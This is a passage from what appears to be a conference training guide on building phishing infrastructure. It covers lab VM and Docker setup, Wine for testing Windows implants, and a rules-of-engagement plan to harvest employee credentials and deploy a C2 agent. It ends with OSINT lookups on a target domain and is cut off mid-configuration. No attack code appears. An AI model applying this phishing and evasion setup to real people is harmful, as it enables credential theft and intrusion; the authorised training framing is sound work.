Introduction</h1><p>Setting the stage for things to come.</p><ul><li>We are going to setup phishing infrastructure.</li><li>Our infrastructure will allow us to:<ul><li>Manage phishing campaigns (Gophish).</li><li>Send emails (MailHog for testing, ??? for production).</li><li>Coordinate requests between users and a login provider (Modlishka).</li><li>Hide from detections / bots.</li><li>Acquire a CSV of users to target (First Name, Last Name, Email, Role).</li></ul></li></ul></div><div class=td-content style=page-break-before:always><h1 id=pg-cd88b2596736e0732f563d037b1514b6>3 - Infrastructure</h1><blockquote><p>Skip this section if taking the training. The lab should already have this.</p></blockquote><p>We&rsquo;ll be using a few different VMs throughout this process. Let&rsquo;s kick off the downloads now since they make take some
time to complete.</p><ul><li><a href="https://ubuntu.com/download/desktop/thank-you?version=22.04.2&amp;architecture=amd64">Ubuntu LTS</a></li><li><a href=https://www.microsoft.com/en-us/software-download/windows10ISO>Windows 10</a></li></ul><h3 id=op-vm>Op VM<a class=td-heading-self-link href=#op-vm aria-label="Heading self-link"></a></h3><p>We need a place to deploy all our stuff. For this workshop, we&rsquo;ll be using VirtualBox and the latest Ubuntu LTS (22.04
LTS). <a href=https://ubuntu.com/tutorials/how-to-run-ubuntu-desktop-on-a-virtual-machine-using-virtualbox#1-overview>Ubuntu has a great walk through on how to do this</a>.</p><h4 id=install-tooling>Install Tooling<a class=td-heading-self-link href=#install-tooling aria-label="Heading self-link"></a></h4><p>We need a handful of tools to accomplish our goals</p><ul><li>git</li><li>docker (podman-docker)</li></ul><p>following: <a href=https://docs.docker.com/engine/install/ubuntu/>https://docs.docker.com/engine/install/ubuntu/</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>
</span></span><span class=line><span class=cl>sudo apt-get install <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    ca-certificates <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    curl <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    gnupg <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    git vim
</span></span><span class=line><span class=cl>sudo mkdir -m <span class=m>0755</span> -p /etc/apt/keyrings
</span></span><span class=line><span class=cl>curl -fsSL https://download.docker.com/linux/ubuntu/gpg <span class=p>|</span> sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>  <span class=s2>&#34;deb [arch=&#34;</span><span class=k>$(</span>dpkg --print-architecture<span class=k>)</span><span class=s2>&#34; signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \
</span></span></span><span class=line><span class=cl><span class=s2>  &#34;</span><span class=k>$(</span>. /etc/os-release <span class=o>&amp;&amp;</span> <span class=nb>echo</span> <span class=s2>&#34;</span><span class=nv>$VERSION_CODENAME</span><span class=s2>&#34;</span><span class=k>)</span><span class=s2>&#34; stable&#34;</span> <span class=p>|</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>  sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null
</span></span><span class=line><span class=cl>sudo apt-get update
</span></span><span class=line><span class=cl>sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin 
</span></span></code></pre></div><p>I also installed VS Code (<a href="https://code.visualstudio.com/sha/download?build=stable&amp;os=linux-deb-x64">https://code.visualstudio.com/sha/download?build=stable&amp;os=linux-deb-x64</a>)</p><h3 id=testing-windows-implants>Testing windows implants<a class=td-heading-self-link href=#testing-windows-implants aria-label="Heading self-link"></a></h3><p>To test windows implants on Linux, install wine (<a href=https://wiki.winehq.org/Ubuntu)>https://wiki.winehq.org/Ubuntu)</a>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo dpkg --add-architecture i386
</span></span><span class=line><span class=cl>sudo mkdir -pm755 /etc/apt/keyrings<span class=se>\n</span>sudo wget -O /etc/apt/keyrings/winehq-archive.key https://dl.winehq.org/wine-builds/winehq.key
</span></span><span class=line><span class=cl>sudo wget -NP /etc/apt/sources.list.d/ https://dl.winehq.org/wine-builds/ubuntu/dists/jammy/winehq-jammy.sources
</span></span><span class=line><span class=cl>sudo apt update
</span></span><span class=line><span class=cl>sudo apt install --install-recommends winehq-stable
</span></span></code></pre></div><p>Now a quick test in a terminal:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>wine cmd.exe
</span></span></code></pre></div><p>You may get some prompts to follow, you should follow them&mldr; Eventually you should get a nice <code>cmd.exe</code> prompt.</p><p><img src=/static/how-to-phishing/wine-cmd.png alt="Wine CMD"></p><h3 id=docker-dns-magic>Docker DNS Magic<a class=td-heading-self-link href=#docker-dns-magic aria-label="Heading self-link"></a></h3><p>In an effort to make things more clear and easier to understand while we hop through browser tabs and URLS, we&rsquo;ll want
to set up some DNS magic for our docker containers. This requires us to replace the default <code>systemd-resolved</code> in Ubuntu
with <code>dnsmasq</code>. Then we&rsquo;ll use a program to populate <code>dnsmasq</code> configuration with docker container information. This
step is only for local testing.</p><p>This <a href=https://computingforgeeks.com/install-and-configure-dnsmasq-on-ubuntu/>article</a> came in handy to switch to
<code>dnsmasq</code>. In addition to that article, we&rsquo;ll also need to add the following to the <code>dnsmasq.conf</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>conf-dir=/etc/dnsmasq.d
</span></span></code></pre></div><p>Now we need to install Golang so we can build <a href=https://github.com/defektive/docker-dnsmasq>docker-dnsmasq</a>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo apt install golang
</span></span><span class=line><span class=cl>go install github.com/defektive/docker-dnsmasq@latest
</span></span></code></pre></div><p>Now would be a good time to add <code>~/go/bin</code> to our <code>$PATH</code>.</p><p>Now we should be able to run this in a new terminal window:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo <span class=sb>`</span>which docker-dnsmasq<span class=sb>`</span> daemon
</span></span></code></pre></div><p>We can test everything is working properly by starting a container with the <code>VIRTUAL_HOST</code> environment variable. Then
pinging that docker container <code>VIRTUAL_HOST</code> name.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo docker run --rm -e <span class=nv>VIRTUAL_HOST</span><span class=o>=</span>mailhog.docker mailhog/mailhog
</span></span><span class=line><span class=cl>ping mailhog.docker
</span></span></code></pre></div><p><img src=/static/how-to-phishing/ping-docker-container.png alt="Ping Docker Container"></p><p>We should also be able to ping random subdomains:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ping asdasd.mailhog.docker
</span></span></code></pre></div><p><img src=/static/how-to-phishing/ping-docker-container-subdomain.png alt="Ping Docker Container Subdomain"></p><h3 id=windows-vm>Windows VM<a class=td-heading-self-link href=#windows-vm aria-label="Heading self-link"></a></h3><p>We&rsquo;ll want a Windows box to do a little bit of payload development and testing. Once windows is installed, we&rsquo;ll need to
install <a href=https://visualstudio.microsoft.com/vs/community/>Visual Studio Community</a>. When configuring visual studio
select <em>.NET Development</em>.</p><p><a href=https://learn.microsoft.com/en-us/dotnet/framework/install/dotnet-35-windows#enable-the-net-framework-35-in-control-panel>https://learn.microsoft.com/en-us/dotnet/framework/install/dotnet-35-windows#enable-the-net-framework-35-in-control-panel</a></p><h3 id=change-networking-to-bridged>Change networking to bridged<a class=td-heading-self-link href=#change-networking-to-bridged aria-label="Heading self-link"></a></h3><p>We need to change our VM&rsquo;s network settings to be bridge so they can talk to each other.</p><h3 id=install-guest-utils>Install Guest Utils<a class=td-heading-self-link href=#install-guest-utils aria-label="Heading self-link"></a></h3><p>We should install virtualbox guest utils. This will make things much easier when we want to share things between our
VMs.</p></div><div class=td-content style=page-break-before:always><h1 id=pg-a292a7a5f0408555b285152be77996a9>4 - What isn't covered?</h1><p>These should be considered in real engagements</p><ul><li>Domain reputation.</li><li>Impossible travel detection&rsquo;s.</li><li><del>Target acquisition.</del> Lightly covered.</li><li>Designing target specific campaigns.</li><li>??? Probably more&mldr;</li></ul></div><div class=td-content style=page-break-before:always><h1 id=pg-6e05732626bbbfc73470eeef725f5110>5 - Lab Environment</h1><blockquote><p>This is for onsite training. Skip this section if not taking training.</p></blockquote><h3 id=connect-to-the-lab-network>Connect to the lab network<a class=td-heading-self-link href=#connect-to-the-lab-network aria-label="Heading self-link"></a></h3><p>Connecting to the lab environment.</p><ul><li>WiFi Name: <code>SaintConPhishingTraining</code></li><li>WiFi_Pass: <code>I can haz teh phish now?</code></li></ul><h3 id=sign-in-to-the-lab-environment>Sign in to the lab environment<a class=td-heading-self-link href=#sign-in-to-the-lab-environment aria-label="Heading self-link"></a></h3><p>Once connected to the Wi-Fi, open the lab environment URL.</p><p><a href=https://console.lab.dfktv:8443/#/>https://console.lab.dfktv:8443/#/</a></p><p>Use your supplied credentials to login.</p><p><img src=/static/how-to-phishing/guac-login.png alt="Guacamole Login"></p><p>You should see two VM connections waiting for you.</p><p><img src=/static/how-to-phishing/guac-vm-connections.png alt="Guacamole Connections"></p><h3 id=success>Success!<a class=td-heading-self-link href=#success aria-label="Heading self-link"></a></h3><p>Welcome to the SAINTCON Phishing Security team! We have been tasked to perform a social engagement. You will be the lead operator on the engagement. Continue to the RoE when instructed to do so.</p></div><div class=td-content style=page-break-before:always><h1 id=pg-bd43c938d3d8aca1ab574be48bdb104b>6 - Lab Environment: Rules of Engagement</h1><blockquote><p>This is for onsite training. Skip this section if not taking training.</p></blockquote><p>SAINTCON Phishing has been tasked to perform a penetration test against SnakShare&rsquo;s information systems and employees. SnakShare recently implemented new email security protections.</p><h3 id=scope>Scope<a class=td-heading-self-link href=#scope aria-label="Heading self-link"></a></h3><ul><li>snakshare.com and any subdomains</li><li>mail.snakshare.com</li><li>auth.snakshare.com</li></ul><h3 id=rules-of-engagement>Rules of Engagement<a class=td-heading-self-link href=#rules-of-engagement aria-label="Heading self-link"></a></h3><ul><li>Target email addresses will NOT be supplied.</li></ul><h3 id=test-plan>Test Plan<a class=td-heading-self-link href=#test-plan aria-label="Heading self-link"></a></h3><p>Effektive Ops will conduct the following.</p><ul><li>Perform OSINT against SnakShare.</li><li>Compile a list of potential SnakShare employees and email addresses.</li><li>Perform a phishing engagement against discovered employees.<ul><li>Harvest credentials.</li><li>Deploy C2 agent on to victim machines.</li></ul></li></ul></div><div class=td-content style=page-break-before:always><h1 id=pg-8f8f0920ef9de8f09af53324d31dd0ba>7 - Setup Operations Directory</h1><p>We need a nice place to organize and store everything. For this exercise, we&rsquo;ll use <code>~/Desktop/op</code>. We&rsquo;ll also need a <code>docker</code> directory to put our docker configuration in.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mkdir -p ~/Desktop/op/docker
</span></span><span class=line><span class=cl>touch ~/Desktop/op/docker/docker-compose.yml
</span></span></code></pre></div></div><div class=td-content style=page-break-before:always><h1 id=pg-b694bb432957ece9c1c417b720f19f1d>8 - OSINT</h1><p>It is time to perform OSINT on our target&mldr;.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>host snakshare.com
</span></span></code></pre></div><p>We should see something like this.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>➜  ~ host snakshare.com
</span></span><span class=line><span class=cl>snakshare.com has address 162.255.119.59
</span></span><span class=line><span class=cl>snakshare.com mail is handled by 10 eforward3.registrar-servers.com.
</span></span><span class=line><span class=cl>snakshare.com mail is handled by 20 eforward5.registrar-servers.com.
</span></span><span class=line><span class=cl>snakshare.com mail is handled by 15 eforward4.registrar-servers.com.
</span></span><span class=line><span class=cl>snakshare.com mail is handled by 10 eforward1.registrar-servers.com.
</span></span><span class=line><span class=cl>snakshare.com mail is handled by 10 eforward2.registrar-servers.com.
</span></span></code></pre></div><p>I like to do a reverse host look up.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>host 162.255.119.59
</span></span></code></pre></div><p>But that gives us nothing&mldr;.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>➜  ~ host 162.255.119.59
</span></span><span class=line><span class=cl>Host 59.119.255.162.in-addr.arpa. not found: 3(NXDOMAIN)
</span></span></code></pre></div><p>Do a whois on the IP address.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>whois 162.255.119.59
</span></span></code></pre></div><p>This gives us lots of info.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>➜  ~ whois 162.255.119.59
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#
</span></span><span class=line><span class=cl># ARIN WHOIS data and services are subject to the Terms of Use
</span></span><span class=line><span class=cl># available at: https://www.arin.net/resources/registry/whois/tou/
</span></span><span class=line><span class=cl>#
</span></span><span class=line><span class=cl># If you see inaccuracies in the results, please report at
</span></span><span class=line><span class=cl># https://www.arin.net/resources/registry/whois/inaccuracy_reporting/
</span></span><span class=line><span class=cl>#
</span></span><span class=line><span class=cl># Copyright 1997-2023, American Registry for Internet Numbers, Ltd.
</span></span><span class=line><span class=cl>#
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>NetRange:       162.255.116.0 - 162.255.119.255
</span></span><span class=line><span class=cl>CIDR:           162.255.116.0/22
</span></span><span class=line><span class=cl>NetName:        NCNET-5
</span></span><span class=line><span class=cl>NetHandle:      NET-162-255-116-0-1
</span></span><span class=line><span class=cl>Parent:         NET162 (NET-162-0-0-0-0)
</span></span><span class=line><span class=cl>NetType:        Direct Allocation
</span></span><span class=line><span class=cl>OriginAS:       AS16626, AS174, AS3356, AS4323, AS22612, AS32421
</span></span><span class=line><span class=cl>Organization:   Namecheap, Inc. (NAMEC-4)
</span></span><span class=line><span class=cl>RegDate:        2014-05-14
</span></span><span class=line><span class=cl>Updated:        2015-03-24
</span></span><span class=line><span class=cl>Comment:        http://namecheap.com
</span></span><span class=line><span class=cl>Comment:        for any abuse please use: abuse@namecheap.com
</span></span><span class=line><span class=cl>Ref:            https://rdap.arin.net/registry/ip/162.255.116.0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>OrgName:        Namecheap, Inc.
</span></span><span class=line><span class=cl>OrgId:          NAMEC-4
</span></span><span class=line><span class=cl>Address:        11400 W. Olympic Blvd. Suite 200
</span></span><span class=line><span class=cl>City:           Los Angeles
</span></span><span class=line><span class=cl>StateProv:      CA
</span></span><span class=line><span class=cl>PostalCode:     90064
</span></span><span class=line><span class=cl>Country:        US
</span></span><span class=line><span class=cl>RegDate:        2011-01-28
</span></span><span class=line><span class=cl>Updated:        2017-01-28
</span></span><span class=line><span class=cl>Ref:            https://rdap.arin.net/registry/entity/NAMEC-4
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>ReferralServer:  rwhois://whois.namecheaphosting.com:4321
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>OrgAbuseHandle: ABUSE2885-ARIN
</span></span><span class=line><span class=cl>OrgAbuseName:   Abuse team
</span></span><span class=line><span class=cl>OrgAbusePhone:  +1-323-375-2822
</span></span><span class=line><span class=cl>OrgAbuseEmail:  abuse@namecheaphosting.com
</span></span><span class=line><span class=cl>OrgAbuseRef:    https://rdap.arin.net/registry/entity/ABUSE2885-ARIN
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>OrgTechHandle: EFIME-ARIN
</span></span><span class=line><span class=cl>OrgTechName:   Efimenko, Igor
</span></span><span class=line><span class=cl>OrgTechPhone:  +1-323-375-2822
</span></span><span class=line><span class=cl>OrgTechEmail:  igor.e@namecheap.com
</span></span><span class=line><span class=cl>OrgTechRef:    https://rdap.arin.net/registry/entity/EFIME-ARIN
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>OrgTechHandle: TECHT4-ARIN
</span></span><span class=line><span class=cl>OrgTechName:   Tech team
</span></span><span class=line><span class=cl>OrgTechPhone:  +1-323-375-2822
</span></span><span class=line><span class=cl>OrgTechEmail:  tech@namecheaphosting.com
</span></span><span class=line><span class=cl>OrgTechRef:    https://rdap.arin.net/registry/entity/TECHT4-ARIN
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#
</span></span><span class=line><span class=cl># ARIN WHOIS data and services are subject to the Terms of Use
</span></span><span class=line><span class=cl># available at: https://www.arin.net/resources/registry/whois/tou/
</span></span><span class=line><span class=cl>#
</span></span><span class=line><span class=cl># If you see inaccuracies in the results, please report at
</span></span><span class=line><span class=cl># https://www.arin.net/resources/registry/whois/inaccuracy_reporting/
</span></span><span class=line><span class=cl>#
</span></span><span class=line><span class=cl># Copyright 1997-2023, American Registry for Internet Numbers, Ltd.
</span></span><span class=line><span class=cl>#
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Found a referral to whois.namecheaphosting.com:4321.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>%rwhois V-1.0,V-1.5:00090h:00 billing.web-hosting.com (Ubersmith RWhois Server V-4.5.5)
</span></span><span class=line><span class=cl>autharea=162.255.119.0/24
</span></span><span class=line><span class=cl>xautharea=162.255.119.0/24
</span></span><span class=line><span class=cl>network:Class-Name:network
</span></span><span class=line><span class=cl>network:Auth-Area:162.255.119.0/24
</span></span><span class=line><span class=cl>network:ID:NET-79087.162.255.119.0/24
</span></span><span class=line><span class=cl>network:Network-Name:anycast-edge-fwd-range
</span></span><span class=line><span class=cl>network:IP-Network:162.255.119.0/24
</span></span><span class=line><span class=cl>network:IP-Network-Block:162.255.119.0 - 162.255.119.255
</span></span><span class=line><span class=cl>network:Org-Name:Web-hosting.com
</span></span><span class=line><span class=cl>network:Street-Address:900 N. Alameda St., Suite 220
</span></span><span class=line><span class=cl>network:City:Los Angeles
</span></span><span class=line><span class=cl>network:State:CA
</span></span><span class=line><span class=cl>network:Postal-Code:90012
</span></span><span class=line><span class=cl>network:Country-Code:US
</span></span><span class=line><span class=cl>network:Tech-Contact:MAINT-79087.162.255.119.0/24
</span></span><span class=line><span class=cl>network:Created:20190523133959000
</span></span><span class=line><span class=cl>network:Updated:20190523163000000
</span></span><span class=line><span class=cl>network:Updated-By:net-admin@namecheap.com
</span></span><span class=line><span class=cl>contact:POC-Name:Network team
</span></span><span class=line><span class=cl>contact:POC-Email:net-admin@namecheap.com
</span></span><span class=line><span class=cl>contact:POC-Phone:
</span></span><span class=line><span class=cl>contact:Tech-Name:Network team
</span></span><span class=line><span class=cl>contact:Tech-Email:net-admin@namecheap.com
</span></span><span class=line><span class=cl>contact:Tech-Phone:
</span></span><span class=line><span class=cl>contact:Abuse-Name:Abuse team
</span></span><span class=line><span class=cl>contact:Abuse-Email:abuse@namecheaphosting.com
</span></span><span class=line><span class=cl>%ok
</span></span></code></pre></div><p>We can see this IP address belongs to Namecheap. Probably sitting there for the default settings that redirect domain to the <code>www.</code> subdomain. Lets curl it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl -i snakshare.com
</span></span></code></pre></div><p>Yep! just a redirect to <code>www.snakshare.com</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>➜  ~ curl -i snakshare.com
</span></span><span class=line><span class=cl>HTTP/1.1 302 Found
</span></span><span class=line><span class=cl>Date: Fri, 20 Oct 2023 01:52:52 GMT
</span></span><span class=line><span class=cl>Content-Type: text/html; charset=utf-8
</span></span><span class=line><span class=cl>Content-Length: 48
</span></span><span class=line><span class=cl>Connection: keep-alive
</span></span><span class=line><span class=cl>Location: https://www.snakshare.com
</span></span><span class=line><span class=cl>X-Served-By: Namecheap URL Forward
</span></span><span class=line><span class=cl>Server: namecheap-nginx
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;a href=&#39;https://www.snakshare.com&#39;&gt;Found&lt;/a&gt;.
</span></span></code></pre></div><p>Repeat those steps for the <code>www</code> subdomain.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>host www.snakshare.com
</span></span></code></pre></div><p>Lets examine the output.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>➜  ~ host www.snakshare.com
</span></span><span class=line><span class=cl>www.snakshare.com is an alias for snakshare.github.io.
</span></span><span class=line><span class=cl>snakshare.github.io has address 185.199.109.153
</span></span><span class=line><span class=cl>snakshare.github.io has address 185.199.111.153
</span></span><span class=line><span class=cl>snakshare.github.io has address 185.199.108.153
</span></span><span class=line><span class=cl>snakshare.github.io has address 185.199.110.153
</span></span><span class=line><span class=cl>snakshare.github.io has IPv6 address 2606:50c0:8000::153
</span></span><span class=line><span class=cl>snakshare.github.io has IPv6 address 2606:50c0:8003::153
</span></span><span class=line><span class=cl>snakshare.github.io has IPv6 address 2606:50c0:8001::153
</span></span><span class=line><span class=cl>snakshare.github.io has IPv6 address 2606:50c0:8002::153
</span></span></code></pre></div><p>This looks a little different. We have an alias to <code>snakshare.github.io</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>host 185.199.109.153
</span></span></code></pre></div><p>A host lookup on the IP reveals a GitHub domain.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>➜  ~ host 185.199.109.153
</span></span><span class=line><span class=cl>153.109.199.185.in-addr.arpa domain name pointer cdn-185-199-109-153.github.com.
</span></span></code></pre></div><p>We can doubly confirm, with a whois on the IP.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>whois 185.199.109.153
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>➜  ~ whois 185.199.109.153
</span></span><span class=line><span class=cl>% This is the RIPE Database query service.
</span></span><span class=line><span class=cl>% The objects are in RPSL format.
</span></span><span class=line><span class=cl>%
</span></span><span class=line><span class=cl>% The RIPE Database is subject to Terms and Conditions.
</span></span><span class=line><span class=cl>% See https://apps.db.ripe.net/docs/HTML-Terms-And-Conditions
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>% Note: this output has been filtered.
</span></span><span class=line><span class=cl>%       To receive output for a database update, use the &#34;-B&#34; flag.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>% Information related to &#39;185.199.108.0 - 185.199.111.255&#39;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>% Abuse contact for &#39;185.199.108.0 - 185.199.111.255&#39; is &#39;abuse@github.com&#39;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>inetnum:        185.199.108.0 - 185.199.111.255
</span></span><span class=line><span class=cl>netname:        US-GITHUB-20170413
</span></span><span class=line><span class=cl>country:        US
</span></span><span class=line><span class=cl>org:            ORG-GI58-RIPE
</span></span><span class=line><span class=cl>admin-c:        GA9828-RIPE
</span></span><span class=line><span class=cl>tech-c:         NO1444-RIPE
</span></span><span class=line><span class=cl>status:         ALLOCATED PA
</span></span><span class=line><span class=cl>mnt-by:         RIPE-NCC-HM-MNT
</span></span><span class=line><span class=cl>mnt-by:         us-github-1-mnt
</span></span><span class=line><span class=cl>created:        2017-04-13T15:36:35Z
</span></span><span class=line><span class=cl>last-modified:  2018-12-14T10:48:39Z
</span></span><span class=line><span class=cl>source:         RIPE
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>organisation:   ORG-GI58-RIPE
</span></span><span class=line><span class=cl>org-name:       GitHub, Inc.
</span></span><span class=line><span class=cl>country:        US
</span></span><span class=line><span class=cl>org-type:       LIR
</span></span><span class=line><span class=cl>address:        88 Colin P. Kelly Jr. Street
</span></span><span class=line><span class=cl>address:        94107
</span></span><span class=line><span class=cl>address:        San Francisco
</span></span><span class=line><span class=cl>address:        UNITED STATES
</span></span><span class=line><span class=cl>phone:          +1 415 735 4488
</span></span><span class=line><span class=cl>admin-c:        GA9828-RIPE
</span></span><span class=line><span class=cl>tech-c:         NO1444-RIPE
</span></span><span class=line><span class=cl>abuse-c:        AR39914-RIPE
</span></span><span class=line><span class=cl>mnt-ref:        us-github-1-mnt
</span></span><span class=line><span class=cl>mnt-by:         RIPE-NCC-HM-MNT
</span></span><span class=line><span class=cl>mnt-by:         us-github-1-mnt
</span></span><span class=line><span class=cl>created:        2017-04-11T08:28:46Z
</span></span><span class=line><span class=cl>last-modified:  2020-12-16T13:16:10Z
</span></span><span class=line><span class=cl>source:         RIPE # Filtered
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>role:           GitHub Admin
</span></span><span class=line><span class=cl>address:        88 Colin P. Kelly Jr. Street
</span></span><span class=line><span class=cl>address:        94107
</span></span><span class=line><span class=cl>address:        San Francisco
</span></span><span class=line><span class=cl>address:        UNITED STATES
</span></span><span class=line><span class=cl>nic-hdl:        GA9828-RIPE
</span></span><span class=line><span class=cl>mnt-by:         us-github-1-mnt
</span></span><span class=line><span class=cl>created:        2017-04-18T22:16:30Z
</span></span><span class=line><span class=cl>last-modified:  2017-04-18T22:18:03Z
</span></span><span class=line><span class=cl>source:         RIPE # Filtered
</span></span><span class=line><span class=cl>abuse-mailbox:  abuse@github.com
</span></span><span class=line><span class=cl>org:            ORG-GI58-RIPE
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>role:           GitHub Network Operations
</span></span><span class=line><span class=cl>address:        88 Colin P. Kelly Jr. Street
</span></span><span class=line><span class=cl>address:        94107
</span></span><span class=line><span class=cl>address:        San Francisco
</span></span><span class=line><span class=cl>address:        California
</span></span><span class=line><span class=cl>address:        UNITED STATES
</span></span><span class=line><span class=cl>nic-hdl:        NO1444-RIPE
</span></span><span class=line><span class=cl>mnt-by:         us-github-1-mnt
</span></span><span class=line><span class=cl>created:        2017-04-18T20:05:01Z
</span></span><span class=line><span class=cl>last-modified:  2017-04-18T22:19:53Z
</span></span><span class=line><span class=cl>source:         RIPE # Filtered
</span></span><span class=line><span class=cl>org:            ORG-GI58-RIPE
</span></span><span class=line><span class=cl>admin-c:        GA9828-RIPE
</span></span><span class=line><span class=cl>abuse-mailbox:  abuse@github.com
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>% Information related to &#39;185.199.109.0/24AS36459&#39;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>route:          185.199.109.0/24
</span></span><span class=line><span class=cl>origin:         AS36459
</span></span><span class=line><span class=cl>mnt-by:         us-github-1-mnt
</span></span><span class=line><span class=cl>created:        2017-04-18T21:02:25Z
</span></span><span class=line><span class=cl>last-modified:  2017-04-18T21:02:25Z
</span></span><span class=line><span class=cl>source:         RIPE
</span></span><span class=line><span class=cl>org:            ORG-GI58-RIPE
</span></span><span class=line><span class=cl>descr:          GitHub - 185.199.109.0/24
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>organisation:   ORG-GI58-RIPE
</span></span><span class=line><span class=cl>org-name:       GitHub, Inc.
</span></span><span class=line><span class=cl>country:        US
</span></span><span class=line><span class=cl>org-type:       LIR
</span></span><span class=line><span class=cl>address:        88 Colin P. Kelly Jr. Street
</span></span><span class=line><span class=cl>address:        94107
</span></span><span class=line><span class=cl>address:        San Francisco
</span></span><span class=line><span class=cl>address:        UNITED STATES
</span></span><span class=line><span class=cl>phone:          +1 415 735 4488
</span></span><span class=line><span class=cl>admin-c:        GA9828-RIPE
</span></span><span class=line><span class=cl>tech-c:         NO1444-RIPE
</span></span><span class=line><span class=cl>abuse-c:        AR39914-RIPE
</span></span><span class=line><span class=cl>mnt-ref:        us-github-1-mnt
</span></span><span class=line><span class=cl>mnt-by:         RIPE-NCC-HM-MNT
</span></span><span class=line><span class=cl>mnt-by:         us-github-1-mnt
</span></span><span class=line><span class=cl>created:        2017-04-11T08:28:46Z
</span></span><span class=line><span class=cl>last-modified:  2020-12-16T13:16:10Z
</span></span><span class=line><span class=cl>source:         RIPE # Filtered
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>% This query was served by the RIPE Database Query Service version 1.108 (SHETLAND)
</span></span></code></pre></div></div><div class=td-content style=page-break-before:always><h1 id=pg-6aec0996226f0c4aaeb229d1f2476881>9 - Mailhog</h1><p>MailHog is an SMTP server used for testing various applications that send emails. It provides a simple web interface to view what messages have been sent. Let&rsquo;s edit our new <code>~/Desktop/op/docker/docker-compose.yml</code> file and add the following to configure MailHog.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-yml data-lang=yml><span class=line><span class=cl><span class=nt>version</span><span class=p>:</span><span class=w> </span><span class=s2>&#34;3&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>services</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>mailhog</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>image</span><span class=p>:</span><span class=w> </span><span class=l>mailhog/mailhog</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>container_name</span><span class=p>:</span><span class=w> </span><span class=l>mailhog</span><span class=w>
